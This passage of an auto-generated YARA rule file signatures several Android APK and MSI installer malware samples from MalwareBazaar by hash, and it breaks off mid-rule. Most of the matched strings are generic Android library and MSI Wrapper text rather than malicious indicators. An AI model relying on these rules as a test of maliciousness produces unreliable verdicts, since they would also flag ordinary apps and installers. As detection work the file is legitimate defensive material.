/* Super Rules ------------------------------------------------------------- */

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e69_0 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash3 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
      hash4 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s2 = "##password_toggle_content_description" fullword ascii
      $s3 = "  passwordToggleContentDescription" fullword ascii
      $s4 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s5 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s6 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s7 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s8 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s9 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s10 = "error_icon_content_description" fullword ascii
      $s11 = "66ThemeOverlay.MaterialComponents.Dialog.Alert.Framework" fullword ascii
      $s12 = "AABase.ThemeOverlay.MaterialComponents.Light.Dialog.Alert.Framework" fullword ascii
      $s13 = "**mtrl_exposed_dropdown_menu_popup_elevation" fullword ascii
      $s14 = "META-INF/androidx.lifecycle_lifecycle-process.versionPK" fullword ascii
      $s15 = "errorContentDescription" fullword ascii
      $s16 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s17 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s18 = "path_password_eye" fullword ascii
      $s19 = "%%path_password_eye_mask_strike_through" fullword ascii
      $s20 = "design_password_eye" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b_5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda8_1 {
   meta:
      description = "evidences - from files 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash2 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
   strings:
      $s1 = "m3_alert_dialog_elevation" fullword ascii
      $s2 = "**m3_comp_bottom_app_bar_container_elevation" fullword ascii
      $s3 = "//m3_comp_fab_primary_pressed_container_elevation" fullword ascii
      $s4 = "66m3_comp_extended_fab_primary_hover_container_elevation" fullword ascii
      $s5 = "00Base.Widget.Material3.CompoundButton.RadioButton" fullword ascii
      $s6 = "--m3_comp_fab_primary_hover_container_elevation" fullword ascii
      $s7 = "''m3_comp_fab_primary_container_elevation" fullword ascii
      $s8 = "66m3_comp_extended_fab_primary_focus_container_elevation" fullword ascii
      $s9 = "88m3_comp_extended_fab_primary_pressed_container_elevation" fullword ascii
      $s10 = "00m3_comp_extended_fab_primary_container_elevation" fullword ascii
      $s11 = "44Widget.MaterialComponents.NavigationRailView.Compact" fullword ascii
      $s12 = "&&Widget.Material3.Button.ElevatedButton" fullword ascii
      $s13 = "$$Widget.Material3.Chip.Input.Elevated" fullword ascii
      $s14 = "++Widget.Material3.Button.ElevatedButton.Icon" fullword ascii
      $s15 = "))Widget.Material3.Chip.Suggestion.Elevated" fullword ascii
      $s16 = "%%Widget.Material3.Chip.Filter.Elevated" fullword ascii
      $s17 = "%%Widget.Material3.Chip.Assist.Elevated" fullword ascii
      $s18 = "((Widget.Material3.Button.UnelevatedButton" fullword ascii
      $s19 = "))Widget.Material3.Chip.Input.Icon.Elevated" fullword ascii
      $s20 = "Theme.Material3.Dark.Dialog" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b_5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda8_2 {
   meta:
      description = "evidences - from files 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash2 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
      hash3 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s3 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s4 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s5 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s6 = "Fazer login com o Google" fullword ascii
      $s7 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s8 = "OOWidget.MaterialComponents.TextInputLayout.OutlinedBox.Dense.ExposedDropdownMenu" fullword ascii
      $s9 = "MMWidget.MaterialComponents.TextInputLayout.FilledBox.Dense.ExposedDropdownMenu" fullword ascii
      $s10 = "mtrl_navigation_elevation" fullword ascii
      $s11 = "??ThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date" fullword ascii
      $s12 = "mtrl_switch_thumb_elevation" fullword ascii
      $s13 = "Installeer" fullword ascii /* base64 encoded string '"{-jY^z' */
      $s14 = "::MaterialAlertDialog.MaterialComponents.Picker.Date.Spinner" fullword ascii
      $s15 = "00Widget.MaterialComponents.Toolbar.PrimarySurface" fullword ascii
      $s16 = "))mtrl_badge_numberless_content_description" fullword ascii
      $s17 = "Widget.AppCompat.PopupWindow" fullword ascii
      $s18 = "00Widget.AppCompat.Light.ActionBar.TabText.Inverse" fullword ascii
      $s19 = "00res/color/common_google_signin_btn_text_dark.xml" fullword ascii
      $s20 = "22Widget.MaterialComponents.ActionBar.PrimarySurface" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e69_3 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
   strings:
      $s1 = "66m3_comp_outlined_autocomplete_menu_container_elevation" fullword ascii
      $s2 = "66m3_comp_sheet_side_docked_standard_container_elevation" fullword ascii
      $s3 = "tp://ns.adobe.com/xap/1.0/\" xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/Res" ascii
      $s4 = "  m3_side_sheet_standard_elevation" fullword ascii
      $s5 = "addElevationShadow" fullword ascii
      $s6 = "ndtaget" fullword ascii
      $s7 = "Widget.Material3.SideSheet" fullword ascii
      $s8 = "BBWidget.MaterialComponents.MaterialCalendar.HeaderLayout.Fullscreen" fullword ascii
      $s9 = "Postrann" fullword ascii
      $s10 = " handtaget" fullword ascii
      $s11 = "99ShapeAppearance.M3.Comp.Sheet.Side.Docked.Container.Shape" fullword ascii
      $s12 = "00mtrl_picker_navigate_to_current_year_description" fullword ascii
      $s13 = "%'Dvakrat dotaknjena ro" fullword ascii
      $s14 = "\"\"open_search_view_content_container" fullword ascii
      $s15 = "sideSheetDialogTheme" fullword ascii
      $s16 = "i pentru a comuta la afi" fullword ascii
      $s17 = "Auf Ziehpunkt doppelt getippt" fullword ascii
      $s18 = "%%Dubbelgetikt op handgreep voor slepen" fullword ascii
      $s19 = "badgeTextAppearance" fullword ascii
      $s20 = "!!open_search_view_header_container" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e69_4 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash3 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
   strings:
      $s1 = "m3_sys_elevation_level0" fullword ascii
      $s2 = "elevationOverlayAccentColor" fullword ascii
      $s3 = "removeEmbeddedFabElevation" fullword ascii
      $s4 = "mtrl_navigation_rail_elevation" fullword ascii
      $s5 = "m3_sys_elevation_level2" fullword ascii
      $s6 = "44Widget.MaterialComponents.TimePicker.Display.Divider" fullword ascii
      $s7 = "!!actionModeCloseContentDescription" fullword ascii
      $s8 = "00Widget.MaterialComponents.TimePicker.ImageButton" fullword ascii
      $s9 = "77Widget.MaterialComponents.TimePicker.Display.HelperText" fullword ascii
      $s10 = "))material_clock_toggle_content_description" fullword ascii
      $s11 = "++bottomsheet_drag_handle_content_description" fullword ascii
      $s12 = "transformPivotTarget" fullword ascii
      $s13 = "fitCenter" fullword ascii /* base64 encoded string '~+Bz{^' */
      $s14 = "Ipakita ang password" fullword ascii
      $s15 = "--TextAppearance.M3.Sys.Typescale.HeadlineSmall" fullword ascii
      $s16 = ">>Widget.MaterialComponents.TimePicker.Display.TextInputEditText" fullword ascii
      $s17 = "<<Widget.MaterialComponents.TimePicker.Display.TextInputLayout" fullword ascii
      $s18 = "''Base.Widget.MaterialComponents.Snackbar" fullword ascii
      $s19 = "Mostra password" fullword ascii
      $s20 = "::Base.V14.ThemeOverlay.MaterialComponents.BottomSheetDialog" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017_b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863cc_5 {
   meta:
      description = "evidences - from files 95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017.msi, b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc.msi, f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017"
      hash2 = "b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc"
      hash3 = "f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3"
   strings:
      $x1 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s2 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide
      $s3 = "MsiCustomActions.dll" fullword ascii
      $s4 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s5 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii
      $s6 = "Error removing temp executable." fullword wide
      $s7 = "EXPAND.EXE" fullword wide
      $s8 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureProductIconFindRelatedProductsLaunchCondition" ascii
      $s9 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii
      $s10 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s11 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii
      $s12 = "OS supports elevation" fullword wide
      $s13 = "OS does not support elevation" fullword wide
      $s14 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii
      $s15 = "lizeInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionbz.WrappedSetupProgrambz.CustomAc" ascii
      $s16 = "sValidateProductIDMigrateFeatureStatesProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesResolveSourceNOT " ascii
      $s17 = "Execute view" fullword wide
      $s18 = "ICACLS.EXE" fullword wide
      $s19 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s20 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 6000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017_9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb10_6 {
   meta:
      description = "evidences - from files 95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017.msi, 9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb103246f3.msi, b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc.msi, f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017"
      hash2 = "9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb103246f3"
      hash3 = "b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc"
      hash4 = "f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s3 = " Base Class Descriptor at (" fullword ascii
      $s4 = " Class Hierarchy Descriptor'" fullword ascii
      $s5 = " Complete Object Locator'" fullword ascii
      $s6 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s7 = "SummaryInformation" fullword wide /* Goodware String - occured 50 times */
      $s8 = ";;B&F7B" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "@H??wElDj>" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "ExE(;2D" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "Intel;1033" fullword ascii
      $s12 = "B4FhD&B" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "E(?(E8B" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "  </trustInfo>" fullword ascii
      $s15 = " delete[]" fullword ascii
      $s16 = "DrDhD7H" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "@H??wElDj;" fullword ascii /* Goodware String - occured 1 times */
      $s18 = " delete" fullword ascii
      $s19 = "      </requestedPrivileges>" fullword ascii
      $s20 = "      <requestedPrivileges>" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b_da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5_7 {
   meta:
      description = "evidences - from files 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash2 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "META-INF/androidx.exifinterface_exifinterface.versionPK" fullword ascii
      $s2 = "res/hv.xml" fullword ascii
      $s3 = "res/ej.xml" fullword ascii
      $s4 = "res/HQ.xml" fullword ascii
      $s5 = "res/pw.xml" fullword ascii
      $s6 = "V4;.HEa" fullword ascii
      $s7 = "res/nl.xml" fullword ascii
      $s8 = "assets/dexopt/baseline.profmprm" fullword ascii
      $s9 = "res/J7.xml" fullword ascii
      $s10 = ">yiNXtI8" fullword ascii
      $s11 = "res/f9.png" fullword ascii
      $s12 = "res/lE.xml" fullword ascii
      $s13 = "res/ZW.xml" fullword ascii
      $s14 = "res/3h.xml" fullword ascii
      $s15 = "res/LJ.xml" fullword ascii
      $s16 = "res/vl.xml" fullword ascii
      $s17 = "res/p7.xml" fullword ascii
      $s18 = "res/rJ.xml" fullword ascii
      $s19 = "res/VW.png" fullword ascii
      $s20 = "res/vH.xml" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618_da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5_8 {
   meta:
      description = "evidences - from files 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
      hash2 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "META-INF/androidx.lifecycle_lifecycle-service.versionPK" fullword ascii
      $s2 = "play-services-ads-identifier.propertiesPK" fullword ascii
      $s3 = "transport-runtime.properties+K-*" fullword ascii
      $s4 = "transport-runtime.propertiesPK" fullword ascii
      $s5 = "play-services-ads-identifier.properties+K-*" fullword ascii
      $s6 = "hello_blank_fragment" fullword ascii
      $s7 = "Hello blank fragment" fullword ascii
      $s8 = "firebase-components.properties+K-*" fullword ascii
      $s9 = "##res/color/abc_tint_switch_track.xml" fullword ascii
      $s10 = "firebase-components.propertiesPK" fullword ascii
      $s11 = "play-services-measurement-base.propertiesPK" fullword ascii
      $s12 = "network_security_config" fullword ascii
      $s13 = "play-services-measurement-sdk.properties+K-*" fullword ascii
      $s14 = "play-services-measurement-api.propertiesPK" fullword ascii
      $s15 = "firebase-datatransport.propertiesPK" fullword ascii
      $s16 = "play-services-measurement-sdk.propertiesPK" fullword ascii
      $s17 = "res/color/abc_tint_spinner.xml" fullword ascii
      $s18 = "++res/color/abc_btn_colored_text_material.xml" fullword ascii
      $s19 = "res/color/abc_tint_switch_track.xml" fullword ascii
      $s20 = "transport-backend-cct.propertiesPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e69_9 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "1cd2fcefa2300ce3ab36da36faa56102d9c1d471b64515651ff70b9e6967f64b"
      hash3 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "META-INF/androidx.lifecycle_lifecycle-process.version+I," fullword ascii
      $s2 = "okhttp3/internal/publicsuffix/publicsuffixes.gz" fullword ascii
      $s3 = "META-INF/androidx.arch.core_core-runtime.version+I," fullword ascii
      $s4 = "META-INF/androidx.lifecycle_lifecycle-runtime.version+I," fullword ascii
      $s5 = "META-INF/androidx.profileinstaller_profileinstaller.versionPK" fullword ascii
      $s6 = "META-INF/androidx.lifecycle_lifecycle-livedata-core.version+I," fullword ascii
      $s7 = "META-INF/androidx.lifecycle_lifecycle-viewmodel-savedstate.version+I," fullword ascii
      $s8 = "META-INF/androidx.lifecycle_lifecycle-livedata.version+I," fullword ascii
      $s9 = "META-INF/androidx.lifecycle_lifecycle-viewmodel.version+I," fullword ascii
      $s10 = "classes.dex," fullword ascii
      $s11 = "res/LT.xml" fullword ascii
      $s12 = "kotlin/internal/internal.kotlin_builtins}O" fullword ascii
      $s13 = "res/sl.xml" fullword ascii
      $s14 = "res/hP.xml" fullword ascii
      $s15 = "res/rj.9.png" fullword ascii
      $s16 = "res/q6.xml" fullword ascii
      $s17 = "res/R2.xml" fullword ascii
      $s18 = "res/zG.xml" fullword ascii
      $s19 = "res/JQ.xml" fullword ascii
      $s20 = "res/9X.9.png" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda8_10 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
   strings:
      $s1 = "okhttp3/internal/publicsuffix/NOTICEM" fullword ascii
      $s2 = "okhttp3/internal/publicsuffix/NOTICEPK" fullword ascii
      $s3 = "sndOXy0" fullword ascii
      $s4 = "KwG+ 1" fullword ascii
      $s5 = "Adobe ImageReadyq" fullword ascii /* Goodware String - occured 272 times */
      $s6 = "teal_200" fullword ascii
      $s7 = "tatWD(n" fullword ascii
      $s8 = "fqUR[R=3" fullword ascii
      $s9 = "EDQEG3%" fullword ascii
      $s10 = "teal_700" fullword ascii
      $s11 = "purple_500" fullword ascii
      $s12 = "purple_200" fullword ascii
      $s13 = "purple_700" fullword ascii
      $s14 = "LrFl>{6" fullword ascii
      $s15 = "\\JdKI}" fullword ascii
      $s16 = "tKLip5" fullword ascii
      $s17 = "QnsQg4" fullword ascii
      $s18 = "\\u.\"_g" fullword ascii
      $s19 = "zMqU]n" fullword ascii
      $s20 = "WW9C\\5" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017_f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb_11 {
   meta:
      description = "evidences - from files 95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017.msi, f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "95435c784f4d1c3de3ea5c8778cfac60d9a65ce0e7f10b0d3b06ecc07c575017"
      hash2 = "f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3"
   strings:
      $s1 = "tring GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is " ascii
      $s2 = "NBZ.COMPANYNAMEEXEMSI.COMBZ.BASENAMEinstall.exeBZ.ELEVATE_EXECUTABLEneverBZ.INSTALLMODEEARLYBZ.WRAPPERVERSION11.0.53.0BZ.EXITCOD" ascii
      $s3 = "iesWIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTEDSOFTWARE\\[BZ.COMPANYNAME]\\MSI Wrapper\\Installed\\[BZ.WRAPPED_APPID]LogonUser[Lo" ascii
      $s4 = "tained from the Directory table.AttributesRemote execution option, one of irsEnumA conditional statement that will disable this " ascii
      $s5 = "ceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of custom a" ascii
      $s6 = "tring GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is " ascii
      $s7 = "presents a root of the install tree.DefaultDirThe default sub-path under parent's path.FeaturePrimary key used to identify a par" ascii
      $s8 = "ect the presence of the component and to return the path to it.CustomActionPrimary key, name of action, normally appears in sequ" ascii
      $s9 = "less of the 'Action' state associated with the component.KeyPathFile;Registry;ODBCDataSourceEither the primary key into the File" ascii
      $s10 = "ser]regUserNameUSERNAME[USERNAME]regDateDate[Date]regTimeTime[Time]regArgumentsWRAPPED_ARGUMENTS[WRAPPED_ARGUMENTS]131.0.2903.11" ascii
      $s11 = " table, Registry table, or ODBCDataSource table. This extract path is stored when the component is installed, and is used to det" ascii
      $s12 = "E0BZ.INSTALL_SUCCESS_CODESBZ.FIXED_INSTALL_ARGUMENTS/VERYSILENT BZ.UINONE_INSTALL_ARGUMENTSBZ.UIBASIC_INSTALL_ARGUMENTSBZ.UIREDU" ascii
      $s13 = "rectory entry, primary key. If a property by this name is defined, it contains the full path to the directory.Directory_ParentRe" ascii
      $s14 = "component if the specified condition evaluates to the 'True' state. If a component is disabled, it will not be installed, regard" ascii
      $s15 = "ticular feature record.Feature_ParentOptional key of a parent record in the same table. If the parent is not selected, then the " ascii
      $s16 = "ctionExtendedTypeA numeric custom action type that extends code type or option flags of the Type column.Unique identifier for di" ascii
      $s17 = "2Microsoft Corporation{80400F40-109A-4259-A556-D2BA75FE757F}" fullword ascii
      $s18 = "ence table unless private use.The numeric custom action type, consisting of source location, code type, entry, option flags.Sour" ascii
      $s19 = "actually a property name whose value contains the actual path, set either by the AppSearch action or with the default setting ob" ascii
      $s20 = "McdV]bz" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5_12 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "META-INF/androidx.loader_loader.version3" fullword ascii
